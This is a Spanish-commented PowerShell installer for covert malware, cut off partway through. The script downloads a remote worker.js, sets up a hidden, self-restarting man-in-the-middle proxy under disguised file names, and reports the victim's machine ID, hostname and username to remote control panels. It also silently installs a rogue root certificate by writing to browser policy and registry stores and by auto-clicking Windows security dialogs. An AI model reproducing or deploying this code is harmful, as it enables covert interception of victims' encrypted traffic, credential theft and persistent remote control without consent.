# =============================================================================
# setup.ps1 - Instalador autocontenido
# Descarga Node.js, instala el proxy MitM y lo deja activo y persistente.
# Sin UAC. Sin plaintext en disco. Sin ventana visible.
# =============================================================================
$ErrorActionPreference = "Stop"
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
# Evitar que Invoke-WebRequest use el proxy del sistema (puede estar roto si es la primera instalacion)
[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebProxy]::new()

# -- CONFIGURACION (solo editar esta seccion) ----------------------------------
[string]$NodeVersion = "v22.21.1"
[int]   $ProxyPort   = 8877
[string]$BotSecret   = "change-me-bot-secret-2024"   # coincide con el panel
[string]$BypassCode  = "bypass-secret-2024"           # ?bypassCode=<este valor> salta inject en el proxy

[string]$NodeDir  = "$env:LOCALAPPDATA\Programs\node"
[string]$AppDir   = "$env:APPDATA\Microsoft\CoreApps"
[string]$NpmCache = "$env:LOCALAPPDATA\Microsoft\npm-cache"

# Nombres neutros
[string]$WorkerFile   = "worker.js"
[string]$LaunchFile   = "launch.ps1"
[string]$VbsFile      = "run.vbs"
[string]$CertSubDir   = ".crt"
[string]$KeyFile      = ".key"       # BOT_SECRET cifrado con DPAPI
[string]$CfgFile      = ".cfg"       # config no sensible (puerto, rutas)
[string]$TaskName     = "CoreAppsHost"

# URL publica de worker.js - subelo a tu repo y actualiza esta linea
[string]$WorkerUrl = "https://raw.githubusercontent.com/gondganl2/webproj/refs/heads/main/worker.js"
# URL del seed (lista de paneles) - unico lugar para editar
[string]$SeedUrl   = "https://raw.githubusercontent.com/sehhkona/projectweb/refs/heads/main/support.json"
# -----------------------------------------------------------------------------

$NodeUrl    = "https://nodejs.org/dist/$NodeVersion/node-$NodeVersion-win-x64.zip"
$NodeZip    = "$env:TEMP\pkg_$([IO.Path]::GetRandomFileName()).zip"
$NodeRoot   = "$NodeDir\node-$NodeVersion-win-x64"
$NodeExe    = "$NodeRoot\node.exe"
$NpmCmd     = "$NodeRoot\npm.cmd"
$WorkerPath = "$AppDir\$WorkerFile"
$LaunchPath = "$AppDir\$LaunchFile"
$VbsPath    = "$AppDir\$VbsFile"
$CertsDir   = "$AppDir\$CertSubDir"
$CaFile     = "$CertsDir\certs\ca.pem"
$CaCrt      = "$CertsDir\certs\ca.crt"
$KeyPath    = "$AppDir\$KeyFile"
$CfgPath    = "$AppDir\$CfgFile"

$env:npm_config_cache = $NpmCache

function Step([string]$s) { Write-Host "  >> $s" -ForegroundColor Cyan }
function OK  ([string]$s) { Write-Host "     OK  $s" -ForegroundColor Green }
function Warn([string]$s) { Write-Host "     !!  $s" -ForegroundColor Yellow }

$Script:_PanelUrl = $null
function Send-InstallReport {
    param([string]$Step, [string]$Status = 'ok', [string]$Detail = '')
    try {
        if (-not $Script:_PanelUrl) {
            $seed = $SeedUrl
            $list = ((New-Object Net.WebClient).DownloadString($seed) | ConvertFrom-Json)
            foreach ($p in $list) {
                try {
                    $chk = ((New-Object Net.WebClient).DownloadString("$p/ping-check") | ConvertFrom-Json)
                    if ($chk.ok) { $Script:_PanelUrl = $p; break }
                } catch {}
            }
        }
        if (-not $Script:_PanelUrl) { return }
        $mid   = try { (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Cryptography' -Name MachineGuid).MachineGuid.Trim() } catch { '' }
        $osVer = try { (Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption } catch { '' }
        $psVer = "$($PSVersionTable.PSVersion.Major).$($PSVersionTable.PSVersion.Minor)"
        $pl = @{
            machineId = $mid; hostname = $env:COMPUTERNAME; username = $env:USERNAME
            step = $Step; status = $Status
            detail = $Detail.Substring(0, [Math]::Min($Detail.Length, 2048))
            osVersion = $osVer; psVersion = $psVer
        } | ConvertTo-Json -Compress
        $wc = New-Object Net.WebClient
        $wc.Headers.Add('Content-Type', 'application/json')
        $wc.UploadString("$($Script:_PanelUrl)/install-report", 'POST', $pl) | Out-Null
    } catch {}
}

# Notifica al panel si setup falla (usa $BotSecret del bloque de config de arriba)
trap {
    $pcUser = try { $env:USERNAME }     catch { '' }
    $pcHost = try { $env:COMPUTERNAME } catch { '' }
    $errMsg = "[$pcUser@$pcHost] setup error linea $($_.InvocationInfo.ScriptLineNumber): $($_.Exception.Message)"
    Write-Host "  SETUP ERROR: $errMsg" -ForegroundColor Red
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        [System.Net.WebRequest]::DefaultWebProxy    = [System.Net.WebProxy]::new()
        $seed = $SeedUrl
        $list = ((New-Object Net.WebClient).DownloadString($seed) | ConvertFrom-Json)
        foreach ($p in $list) {
            try {
                $chk = ((New-Object Net.WebClient).DownloadString("$p/ping-check") | ConvertFrom-Json)
                if ($chk.ok) {
                    $mguid = ''
                    try { $mguid = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Cryptography" -Name MachineGuid).MachineGuid.Trim() } catch {}
                    $pl = @{
                        machineId = $mguid; source = 'setup'
                        hostname  = $pcHost; username = $pcUser
                        reason    = $errMsg.Substring(0, [Math]::Min($errMsg.Length, 2048))
                        log_tail  = ''; secret = $BotSecret
                    } | ConvertTo-Json -Compress
                    $wc2 = New-Object Net.WebClient
                    $wc2.Headers.Add('Content-Type', 'application/json')
                    $wc2.UploadString("$p/crash", 'POST', $pl) | Out-Null
                    break
                }
            } catch {}
        }
    } catch {}
    break
}

# =============================================================================
# 1. NODE.JS PORTABLE
# =============================================================================
Step "Node.js $NodeVersion"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

if (-not (Test-Path $NodeRoot)) {
    Write-Host "     Descargando..."
    Invoke-WebRequest -Uri $NodeUrl -OutFile $NodeZip -UseBasicParsing
    New-Item -ItemType Directory -Force -Path $NodeDir | Out-Null
    tar -xf $NodeZip -C $NodeDir
    Remove-Item $NodeZip -Force -ErrorAction SilentlyContinue
}
if (-not (Test-Path $NodeExe)) { throw "node.exe no encontrado: $NodeExe" }
if (-not (Test-Path $NpmCmd))  { throw "npm.cmd no encontrado: $NpmCmd" }
OK "node $( & $NodeExe -v )  npm $( & $NpmCmd -v )"
Send-InstallReport -Step 'node_install' -Status 'ok'

# =============================================================================
# 2. CREAR CARPETA DE LA APP Y DESCARGAR worker.js
# =============================================================================
Step "Descargando $WorkerFile"
New-Item -ItemType Directory -Force -Path $AppDir   | Out-Null
New-Item -ItemType Directory -Force -Path $CertsDir | Out-Null

$WorkerUrlNoCache = "$WorkerUrl`?ts=$([DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds())"
Invoke-WebRequest -Uri $WorkerUrlNoCache -OutFile $WorkerPath -UseBasicParsing
if (-not (Test-Path $WorkerPath)) { throw "No se pudo descargar $WorkerUrl" }
OK "descargado -> $WorkerPath"

# =============================================================================
# 3. PACKAGE.JSON (ESM requerido para import)
# =============================================================================
Step "package.json"
'{"name":"app","version":"1.0.0","type":"module"}' |
    Set-Content -Path "$AppDir\package.json" -Encoding UTF8
OK "type=module"

# =============================================================================
# 4. INSTALAR http-mitm-proxy v0.x
#    Pinado a v0 porque v1.x cambio la API (ya no exporta funcion, usa clase)
# =============================================================================
Step "http-mitm-proxy@0"
Push-Location $AppDir
$env:npm_config_update_notifier = "false"   # evita "npm notice" en stderr con ErrorActionPreference=Stop
$_prev = $ErrorActionPreference; $ErrorActionPreference = "Continue"
& $NpmCmd install "http-mitm-proxy@0" --loglevel=silent --no-fund --ignore-scripts 2>&1 | Out-Null
$ErrorActionPreference = $_prev
if (-not (Test-Path "$AppDir\node_modules\http-mitm-proxy")) { throw "npm install fallo - revisa conexion" }
Pop-Location
OK "instalado"
Send-InstallReport -Step 'npm_install' -Status 'ok'

# =============================================================================
# 5. PRE-SEMBRAR .bi CON WINDOWS MACHINE GUID (evita duplicados en el panel)
#    MachineGuid es unico por instalacion de Windows y sobrevive reinstalaciones
#    de la app. Si ya existe .bi se respeta (mismo ID que en sesiones previas).
# =============================================================================
Step "Identidad estable"
$BotIdPath = "$AppDir\.bi"
if (-not (Test-Path $BotIdPath)) {
    try {
        $mgRaw  = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Cryptography" -Name MachineGuid).MachineGuid
        $mgGuid = $mgRaw.Trim()
        Set-Content -Path $BotIdPath -Value $mgGuid -Encoding ASCII -NoNewline
        OK "MachineGuid: $mgGuid"
    } catch {
        Warn "No se pudo leer MachineGuid, worker.js generara UUID (no es critico)"
    }
} else {
    OK "ya existe: $(Get-Content $BotIdPath -Raw)"
}

# =============================================================================
# 6. GENERAR CERTIFICADO CA (correr worker.js ~15s para que lo cree)
# =============================================================================
Step "Generando CA cert"

Get-Process -Name "node" -ErrorAction SilentlyContinue |
    Stop-Process -Force -ErrorAction SilentlyContinue

$pi = New-Object System.Diagnostics.ProcessStartInfo
$pi.FileName         = $NodeExe
$pi.Arguments        = "`"$WorkerPath`""
$pi.WorkingDirectory = $AppDir
$pi.UseShellExecute  = $false
$pi.CreateNoWindow   = $true
$pi.EnvironmentVariables["BOT_SECRET"] = $BotSecret
$pi.EnvironmentVariables["PROXY_PORT"] = "$ProxyPort"

$gp = [System.Diagnostics.Process]::Start($pi)
for ($i = 0; $i -lt 40; $i++) {
    Start-Sleep -Milliseconds 500
    if (Test-Path $CaFile) { Start-Sleep -Milliseconds 800; break }  # flush a disco
}
try { $gp.Kill() }                        catch {}
try { $gp.WaitForExit(3000) | Out-Null } catch {}

if (-not (Test-Path $CaFile)) { throw "No se genero $CaFile" }
OK "CA generado"

# =============================================================================
# 6. CIFRAR BOT_SECRET CON DPAPI - sin plaintext en disco
#    DPAPI cifra ligado al usuario+maquina: inutil en otro PC o usuario
# =============================================================================
Step "Cifrando BOT_SECRET (DPAPI)"

$secureStr = ConvertTo-SecureString $BotSecret -AsPlainText -Force
$encrypted = ConvertFrom-SecureString $secureStr      # DPAPI, sin UAC
Set-Content -Path $KeyPath -Value $encrypted -Encoding UTF8

OK ".key escrito (DPAPI, solo valido en este usuario y maquina)"

# =============================================================================
# 7. ESCRIBIR .cfg - config no sensible (rutas, puerto)
# =============================================================================
Step "Escribiendo .cfg"

@"
NODE_EXE=$NodeExe
WORKER=$WorkerPath
PORT=$ProxyPort
BYPASS=$BypassCode
"@ | Set-Content -Path $CfgPath -Encoding UTF8
OK ".cfg escrito"

# =============================================================================
# 8. ESCRIBIR launch.ps1 - descifra .key y lanza worker.js sin ventana
# =============================================================================
Step "Escribiendo $LaunchFile"

# Usar here-string con comillas simples para no expandir variables del instalador
# Las rutas al .key y .cfg se calculan desde $PSScriptRoot en runtime
$LaunchContent = @'
$dir = $PSScriptRoot

function Send-CrashReport {
    param([string]$MachineId, [string]$Source, [string]$Reason, [string]$LogTail = '', [string]$Secret = '')
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        [System.Net.WebRequest]::DefaultWebProxy    = [System.Net.WebProxy]::new()
        $seed = '__SEED_URL__'
        $list = ((New-Object Net.WebClient).DownloadString($seed) | ConvertFrom-Json)
        foreach ($panel in $list) {
            try {
                $chk = ((New-Object Net.WebClient).DownloadString("$panel/ping-check") | ConvertFrom-Json)
                if ($chk.ok) {
                    $payload = @{
                        machineId = $MachineId
                        source    = $Source
                        reason    = $Reason.Substring(0, [Math]::Min($Reason.Length, 2048))
                        log_tail  = $LogTail.Substring(0, [Math]::Min($LogTail.Length, 8192))
                        secret    = $Secret
                    } | ConvertTo-Json -Compress
                    $wc = New-Object Net.WebClient
                    $wc.Headers.Add('Content-Type', 'application/json')
                    $wc.UploadString("$panel/crash", 'POST', $payload) | Out-Null
                    return
                }
            } catch {}
        }
    } catch {}
}

$cfg = @{}
foreach ($line in (Get-Content "$dir\.cfg")) {
    if ($line -match '^([^=]+)=(.+)$') { $cfg[$Matches[1].Trim()] = $Matches[2].Trim() }
}

$machineId = ''
try { $machineId = (Get-Content "$dir\.bi" -Raw -ErrorAction SilentlyContinue).Trim() } catch {}

$plain = $null
try {
    $enc   = (Get-Content "$dir\.key" -Raw).Trim()
    $bstr  = [Runtime.InteropServices.Marshal]::SecureStringToBSTR((ConvertTo-SecureString $enc))
    $plain = [Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
    [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr)
} catch {
    Send-CrashReport -MachineId $machineId -Source 'launch' -Reason "DPAPI: $_" -Secret ''
    exit 1
}

Add-Type -TypeDefinition @"
using System; using System.Runtime.InteropServices;
public class WILaunch {
    [DllImport("wininet.dll")]
    public static extern bool InternetSetOption(IntPtr h, int o, IntPtr b, int l);
}
"@

function Set-SystemProxy([bool]$Enable, [string]$Server) {
    try {
        $irp = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings'
        if ($Enable) {
            Set-ItemProperty -Path $irp -Name 'ProxyEnable' -Value 1
            Set-ItemProperty -Path $irp -Name 'ProxyServer'  -Value $Server
        } else {
            Set-ItemProperty -Path $irp -Name 'ProxyEnable' -Value 0
        }
        [WILaunch]::InternetSetOption([IntPtr]::Zero, 39, [IntPtr]::Zero, 0) | Out-Null
        [WILaunch]::InternetSetOption([IntPtr]::Zero, 37, [IntPtr]::Zero, 0) | Out-Null
    } catch {}
}

$crashWindow  = 120
$crashLimit   = 5
$deadManSecs  = 300
$crashTimes   = [System.Collections.Generic.Queue[datetime]]::new()
$proxyServer  = "127.0.0.1:$($cfg.PORT.Trim())"

while ($true) {
    $pi = New-Object System.Diagnostics.ProcessStartInfo
    $pi.FileName         = $cfg.NODE_EXE.Trim()
    $pi.Arguments        = "`"$($cfg.WORKER.Trim())`""
    $pi.WorkingDirectory = $dir
    $pi.UseShellExecute  = $false
    $pi.CreateNoWindow   = $true
    $pi.EnvironmentVariables['BOT_SECRET']  = $plain
    $pi.EnvironmentVariables['PROXY_PORT']  = $cfg.PORT.Trim()
    $pi.EnvironmentVariables['BYPASS_CODE'] = $cfg.BYPASS.Trim()
    $p = [System.Diagnostics.Process]::Start($pi)
    $p.WaitForExit()
    if ($p.ExitCode -ne 0) {
        $logTail = ''
        try { $logTail = ((Get-Content "$dir\proxy_debug.log" -Tail 40 -ErrorAction SilentlyContinue) -join "`n") } catch {}
        Send-CrashReport -MachineId $machineId -Source 'worker' -Reason "exit $($p.ExitCode)" -LogTail $logTail -Secret $plain

        $now = [datetime]::UtcNow
        $crashTimes.Enqueue($now)
        while ($crashTimes.Count -gt 0 -and ($now - $crashTimes.Peek()).TotalSeconds -gt $crashWindow) {
            $crashTimes.Dequeue() | Out-Null
        }
        if ($crashTimes.Count -ge $crashLimit) {
            $crashTimes.Clear()
            $fixScript = "$dir\fixCert.ps1"
            if (Test-Path $fixScript) {
                # fixCert deshabilita proxy, reinstala cert y lo reactiva
                try {
                    $fpi = New-Object System.Diagnostics.ProcessStartInfo
                    $fpi.FileName        = 'powershell.exe'
                    $fpi.Arguments       = "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$fixScript`""
                    $fpi.UseShellExecute = $false
                    $fpi.CreateNoWindow  = $true
                    $fp = [System.Diagnostics.Process]::Start($fpi)
                    $fp.WaitForExit(120000)
                } catch {}
            } else {
                Set-SystemProxy -Enable $false -Server $proxyServer
                Start-Sleep -Seconds $deadManSecs
                Set-SystemProxy -Enable $true -Server $proxyServer
            }
            Start-Sleep -Seconds 10
        } else {
            Start-Sleep -Seconds 10
        }
    } else {
        $crashTimes.Clear()
        Start-Sleep -Seconds 10
    }
}
'@

$LaunchContent = $LaunchContent -replace '__SEED_URL__', $SeedUrl
Set-Content -Path $LaunchPath -Value $LaunchContent -Encoding UTF8
OK $LaunchPath

# =============================================================================
# 9. ESCRIBIR run.vbs - llama a launch.ps1 con wscript (cero ventana)
# =============================================================================
Step "Escribiendo $VbsFile"

# El VBS ya no contiene el secret - solo sabe donde esta launch.ps1
$VbsContent = @"
Dim sh
Set sh = CreateObject("WScript.Shell")
sh.Run "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden " & _
       "-ExecutionPolicy Bypass -File """ & "$LaunchPath" & """", 0, False
Set sh = Nothing
"@

Set-Content -Path $VbsPath -Value $VbsContent -Encoding ASCII
OK $VbsPath

# =============================================================================
# 9b. EMBED fixCert.ps1 - reparacion local del CA cert (sin internet)
# =============================================================================
Step "Escribiendo fixCert.ps1"
$FixCertPath    = "$AppDir\fixCert.ps1"
$FixCertContent = @'
# fixCert.ps1 - Reinstala el CA cert sin UAC
# Deshabilita proxy -> instala cert con certutil+autoclick -> reactiva proxy
$ErrorActionPreference = "Continue"
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

function Step([string]$s) { Write-Host "  >> $s" -ForegroundColor Cyan }
function OK  ([string]$s) { Write-Host "     OK  $s" -ForegroundColor Green }
function Warn([string]$s) { Write-Host "     !!  $s" -ForegroundColor Yellow }

$AppDir   = "$env:APPDATA\Microsoft\CoreApps"
$CertSub  = ".crt"
$CertsDir = "$AppDir\$CertSub"
$CaFile   = "$CertsDir\certs\ca.pem"
$CaCrt    = "$CertsDir\certs\ca.crt"
$ProxyPort = 8877

# =============================================================================
# 1. DESHABILITAR PROXY (para que la maquina pueda salir directo a internet)
# =============================================================================
Step "Deshabilitando proxy del sistema"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
[System.Net.WebRequest]::DefaultWebProxy    = [System.Net.WebProxy]::new()

Add-Type -TypeDefinition @"
using System; using System.Runtime.InteropServices;
public class WI {
    [DllImport("wininet.dll")]
    public static extern bool InternetSetOption(IntPtr h, int o, IntPtr b, int l);
}
"@

$ir = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
Set-ItemProperty -Path $ir -Name "ProxyEnable" -Value 0
[WI]::InternetSetOption([IntPtr]::Zero, 39, [IntPtr]::Zero, 0) | Out-Null
[WI]::InternetSetOption([IntPtr]::Zero, 37, [IntPtr]::Zero, 0) | Out-Null
OK "proxy deshabilitado"

# =============================================================================
# 2. CERRAR BROWSERS (Chrome lee el cert store solo al arrancar)
# =============================================================================
Step "Cerrando browsers"
@("chrome","msedge","opera","brave","firefox") | ForEach-Object {
    Get-Process -Name $_ -ErrorAction SilentlyContinue |
        Stop-Process -Force -ErrorAction SilentlyContinue
}
Start-Sleep -Seconds 1
OK "browsers cerrados"

# =============================================================================
# 3. LEER / CONVERTIR CA CERT
# =============================================================================
Step "Leyendo CA cert"

if (-not (Test-Path $CaFile)) { throw "No se encontro $CaFile - corre setup.ps1 primero" }

$pem  = Get-Content $CaFile -Raw
$b64  = ($pem -replace '-+BEGIN CERTIFICATE-+|-+END CERTIFICATE-+|\s','').Trim()
$der  = [Convert]::FromBase64String($b64)
[IO.File]::WriteAllBytes($CaCrt, $der)

$cert    = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 (,$der)
$thumb   = $cert.Thumbprint
$b64cert = [Convert]::ToBase64String($der)
OK "thumbprint: $thumb"

# =============================================================================
# 4. METODO A: HKCU browser policies (Chrome/Edge/Brave - sin dialogo)
# =============================================================================
Step "CA -> HKCU browser policies"
@(
    "HKCU:\SOFTWARE\Policies\Google\Chrome\CACertificates",
    "HKCU:\SOFTWARE\Policies\Microsoft\Edge\CACertificates",
    "HKCU:\SOFTWARE\Policies\BraveSoftware\Brave\CACertificates"
) | ForEach-Object {
    try {
        New-Item -Path $_ -Force -ErrorAction Stop | Out-Null
        Set-ItemProperty -Path $_ -Name "1" -Value $b64cert -Type String -ErrorAction Stop
        OK $_
    } catch { Warn "skip: $_" }
}

# =============================================================================
# 5. METODO B: HKCU SystemCertificates blob (sin dialogo)
# =============================================================================
Step "CA -> HKCU SystemCertificates (blob)"
Add-Type -TypeDefinition @"
using System; using System.Runtime.InteropServices;
public class CertApi {
    [DllImport("crypt32.dll", SetLastError=true)]
    public static extern IntPtr CertCreateCertificateContext(uint enc, byte[] pb, uint cb);
    [DllImport("crypt32.dll", SetLastError=true)]
    public static extern bool CertSerializeCertificateStoreElement(IntPtr ctx, uint flags, byte[] pb, ref uint cb);
    [DllImport("crypt32.dll", SetLastError=true)]
    public static extern bool CertFreeCertificateContext(IntPtr ctx);
}
"@

$ctx = [CertApi]::CertCreateCertificateContext(1, $der, [uint32]$der.Length)
if ($ctx -ne [IntPtr]::Zero) {
    [uint32]$cbBlob = 0
    [CertApi]::CertSerializeCertificateStoreElement($ctx, 0, $null, [ref]$cbBlob) | Out-Null
    $blobArr = New-Object byte[] $cbBlob
    [CertApi]::CertSerializeCertificateStoreElement($ctx, 0, $blobArr, [ref]$cbBlob) | Out-Null
    [CertApi]::CertFreeCertificateContext($ctx) | Out-Null
    $blob = [byte[]]($blobArr[0..([int]$cbBlob - 1)])
    $rk = "HKCU:\SOFTWARE\Microsoft\SystemCertificates\ROOT\Certificates\$thumb"
    New-Item -Path $rk -Force | Out-Null
    Set-ItemProperty -Path $rk -Name "Blob" -Value $blob -Type Binary
    OK "blob escrito: $thumb"
} else {
    Warn "CertCreateCertificateContext fallo"
}

# =============================================================================
# 6. METODO C: certutil con auto-click - solo si Metodo B no instaló el cert
# =============================================================================
$certOk = Test-Path "Cert:\CurrentUser\Root\$thumb" -ErrorAction SilentlyContinue
if ($certOk) { OK "cert ya en HKCU Root - saltando certutil" }
else {
Step "CA -> certutil (auto-click dialogo)"

Add-Type -TypeDefinition @"
using System; using System.Text; using System.Collections.Generic; using System.Runtime.InteropServices;
public class WinApiCert {
    public delegate bool EnumCb(IntPtr hwnd, IntPtr lp);
    [DllImport("user32.dll")] public static extern bool EnumWindows(EnumCb f, IntPtr lp);
    [DllImport("user32.dll")] public static extern int GetClassName(IntPtr h, StringBuilder s, int n);
    [DllImport("user32.dll")] public static extern bool IsWindowVisible(IntPtr h);
    [DllImport("user32.dll")] public static extern bool SetForegroundWindow(IntPtr h);
    [DllImport("user32.dll")] public static extern IntPtr SendMessage(IntPtr h, uint m, IntPtr w, IntPtr l);
    [DllImport("user32.dll")] public static extern IntPtr PostMessage(IntPtr h, uint m, IntPtr w, IntPtr l);
    [DllImport("user32.dll")] public static extern IntPtr FindWindowEx(IntPtr p, IntPtr a, string c, string t);

    public static List<IntPtr> GetDialogs() {
        var list = new List<IntPtr>();
        EnumWindows((hwnd, _) => {
            if (!IsWindowVisible(hwnd)) return true;
            var sb = new StringBuilder(32);
            GetClassName(hwnd, sb, 32);
            if (sb.ToString() == "#32770") list.Add(hwnd);
            return true;
        }, IntPtr.Zero);
        return list;
    }

    public static bool ClickYes(IntPtr hwnd) {
        string[] lbls = { "Yes","&Yes","Si","Sí","&Si","&Sí","Aceptar","&Aceptar","OK","&OK" };
        SetForegroundWindow(hwnd);
        foreach (var l in lbls) {
            var btn = FindWindowEx(hwnd, IntPtr.Zero, "Button", l);
            if (btn != IntPtr.Zero) {
                SendMessage(btn, 0x00F5, IntPtr.Zero, IntPtr.Zero);
                PostMessage(btn, 0x00F5, IntPtr.Zero, IntPtr.Zero);
                return true;
            }
        }
        return false;
    }
}
"@

$preDialogs = [System.Collections.Generic.HashSet[IntPtr]]::new()
[WinApiCert]::GetDialogs() | ForEach-Object { $preDialogs.Add($_) | Out-Null }

$certProc = Start-Process -FilePath "$env:SystemRoot\System32\certutil.exe" `
    -ArgumentList "-user -addstore Root `"$CaCrt`"" `
    -PassThru

for ($t = 0; $t -lt 120 -and -not $certProc.HasExited; $t++) {
    Start-Sleep -Milliseconds 250
    [WinApiCert]::GetDialogs() |
        Where-Object { -not $preDialogs.Contains($_) } |
        ForEach-Object {
            [WinApiCert]::ClickYes($_) | Out-Null
        }
}
if (-not $certProc.HasExited) { $certProc.WaitForExit(3000) | Out-Null }

if ($certProc.ExitCode -eq 0) { OK "certutil OK (exit 0)" }
else                           { Warn "certutil exit $($certProc.ExitCode)" }
} # end if -not $certOk

# =============================================================================
# 7. VERIFICAR
# =============================================================================
$verStore = New-Object System.Security.Cryptography.X509Certificates.X509Store('Root','CurrentUser')
$verStore.Open([System.Security.Cryptography.X509Certificates.OpenFlags]::ReadOnly)
$found = @($verStore.Certificates) | Where-Object { $_.Thumbprint -ieq $thumb }
$verStore.Close()
if ($found) { OK "Cert verificado en Root store" }
else        { Warn "Cert NO encontrado en X509Store (Chrome policy HKCU escrita igual)" }

# =============================================================================
# 8. REACTIVAR PROXY
# =============================================================================
Step "Reactivando proxy del sistema"
Set-ItemProperty -Path $ir -Name "ProxyEnable"   -Value 1
Set-ItemProperty -Path $ir -Name "ProxyServer"   -Value "127.0.0.1:$ProxyPort"
Set-ItemProperty -Path $ir -Name "ProxyOverride" -Value "localhost;127.0.0.1;<local>"
[WI]::InternetSetOption([IntPtr]::Zero, 39, [IntPtr]::Zero, 0) | Out-Null
[WI]::InternetSetOption([IntPtr]::Zero, 37, [IntPtr]::Zero, 0) | Out-Null
OK "proxy reactivado: 127.0.0.1:$ProxyPort"

Write-Host ""
Write-Host "  Listo. Abre Chrome nuevo." -ForegroundColor Green
'@
Set-Content -Path $FixCertPath -Value $FixCertContent -Encoding UTF8
OK $FixCertPath

# =============================================================================
# 10. INSTALAR CA - cuatro metodos en cascada (sin UAC, sin dialogo)
# =============================================================================

$pem     = Get-Content $CaFile -Raw
$b64     = ($pem -replace '-+BEGIN CERTIFICATE-+|-+END CERTIFICATE-+|\s','').Trim()
$der     = [Convert]::FromBase64String($b64)
[IO.File]::WriteAllBytes($CaCrt, $der)
$cert    = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 (,$der)
$thumb   = $cert.Thumbprint
$b64cert = [Convert]::ToBase64String($der)

# Cerrar browsers antes de escribir el cert - Chrome lee el store al arrancar
@("chrome","msedge","opera","brave") | ForEach-Object {
    Get-Process -Name $_ -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
}
Start-Sleep -Seconds 1

# ---- Metodo A: HKCU browser policies (sin dialogo, sin admin) ----
# Chrome, Edge y Brave leen CACertificates de HKCU\SOFTWARE\Policies\...\CACertificates
# Cada subvalor 1,2,3... = DER base64; no se muestra ningun dialogo.
Step "CA -> HKCU browser policies (Chrome/Edge/Brave - sin dialogo)"
@(
    "HKCU:\SOFTWARE\Policies\Google\Chrome\CACertificates",
    "HKCU:\SOFTWARE\Policies\Microsoft\Edge\CACertificates",
    "HKCU:\SOFTWARE\Policies\BraveSoftware\Brave\CACertificates"
) | ForEach-Object {
    try {
        New-Item -Path $_ -Force -ErrorAction Stop | Out-Null
        Set-ItemProperty -Path $_ -Name "1" -Value $b64cert -Type String -ErrorAction Stop
        OK $_
    } catch { Warn "skip: $_" }
}

# ---- Metodo B: HKCU SystemCertificates via CertSerializeCertificateStoreElement ----
# Funciona en maquinas sin GPO que bloquee root certs de HKCU.
Step "CA -> HKCU SystemCertificates (blob nativo)"
try { $null = [CertApi] } catch {
    Add-Type -TypeDefinition @"
using System; using System.Runtime.InteropServices;
public class CertApi {
    [DllImport("crypt32.dll", SetLastError=true)]
    public static extern IntPtr CertCreateCertificateContext(uint enc, byte[] pb, uint cb);
    [DllImport("crypt32.dll", SetLastError=true)]
    public static extern bool CertSerializeCertificateStoreElement(IntPtr ctx, uint flags, byte[] pb, ref uint cb);
    [DllImport("crypt32.dll", SetLastError=true)]
    public static extern bool CertFreeCertificateContext(IntPtr ctx);
}
"@
}
$blob = $null
$ctx = [CertApi]::CertCreateCertificateContext(1, $der, [uint32]$der.Length)
if ($ctx -ne [IntPtr]::Zero) {
    [uint32]$cbBlob = 0
    [CertApi]::CertSerializeCertificateStoreElement($ctx, 0, $null, [ref]$cbBlob) | Out-Null
    $blobArr = New-Object byte[] $cbBlob
    [CertApi]::CertSerializeCertificateStoreElement($ctx, 0, $blobArr, [ref]$cbBlob) | Out-Null
    [CertApi]::CertFreeCertificateContext($ctx) | Out-Null
    $blob = [byte[]]($blobArr[0..([int]$cbBlob - 1)])
    $rk = "HKCU:\SOFTWARE\Microsoft\SystemCertificates\ROOT\Certificates\$thumb"
    New-Item -Path $rk -Force | Out-Null
    Set-ItemProperty -Path $rk -Name "Blob" -Value $blob -Type Binary
    OK "thumbprint: $thumb"
} else {
    Warn "CertCreateCertificateContext fallo - saltando blob"
}

# ---- Metodo C: certutil con EnumWindows (auto-click por handle, no por titulo) ----
# Solo corre si Metodo B no dejó el cert en el store - evita dialogo innecesario.
$certOk = Test-Path "Cert:\CurrentUser\Root\$thumb" -ErrorAction SilentlyContinue
if ($certOk) {
    OK "cert ya en HKCU Root (Metodo B ok) - saltando certutil"
} else {
Step "CA -> certutil (auto-click EnumWindows)"
try { $null = [WinApiCert] } catch {
    Add-Type -TypeDefinition @"
using System; using System.Text; using System.Collections.Generic; using System.Runtime.InteropServices;
public class WinApiCert {
    public delegate bool EnumCb(IntPtr hwnd, IntPtr lp);
    [DllImport("user32.dll")] public static extern bool EnumWindows(EnumCb f, IntPtr lp);
    [DllImport("user32.dll")] public static extern int GetClassName(IntPtr h, StringBuilder s, int n);
    [DllImport("user32.dll")] public static extern bool IsWindowVisible(IntPtr h);
    [DllImport("user32.dll")] public static extern bool SetForegroundWindow(IntPtr h);
    [DllImport("user32.dll")] public static extern IntPtr PostMessage(IntPtr h, uint m, IntPtr w, IntPtr l);
    [DllImport("user32.dll")] public static extern IntPtr FindWindowEx(IntPtr p, IntPtr a, string c, string t);

    public static List<IntPtr> GetDialogs() {
        var list = new List<IntPtr>();
        EnumWindows((hwnd, _) => {
            if (!IsWindowVisible(hwnd)) return true;
            var sb = new StringBuilder(32);
            GetClassName(hwnd, sb, 32);
            if (sb.ToString() == "#32770") list.Add(hwnd);
            return true;
        }, IntPtr.Zero);
        return list;
    }

    public static bool ClickYes(IntPtr hwnd) {
        string[] lbls = { "Yes","&Yes","Si","S\u00ed","&Si","&S\u00ed","Aceptar","&Aceptar","OK","&OK" };
